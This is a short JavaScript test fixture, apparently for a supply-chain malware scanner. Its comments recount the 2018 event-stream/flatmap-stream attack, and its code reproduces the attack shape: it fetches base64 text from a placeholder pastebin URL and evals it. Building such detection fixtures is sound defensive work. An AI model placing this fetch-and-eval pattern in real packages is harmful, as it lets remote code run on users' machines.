// event-stream@3.3.6 (Nov 2018). Famous attack: a new maintainer was
// granted publish rights to the dormant `event-stream` package and
// added a malicious dependency `flatmap-stream` that targeted users
// of the `bitpay/copay` wallet.
//
// The published source itself was clean — the payload lived inside
// flatmap-stream's encrypted .min.js. Our minimum-shape fixture
// reproduces the inline-eval shape that recurred in similar attacks
// (coa, rc 2021):

const https = require('https');

function loadRemote() {
  return new Promise((resolve) => {
    https.get('https://pastebin.com/raw/abcdefgh', (r) => {
      let d = '';
      r.on('data', (c) => (d += c));
      r.on('end', () => resolve(eval(Buffer.from(d, 'base64').toString())));
    });
  });
}

module.exports = { loadRemote };
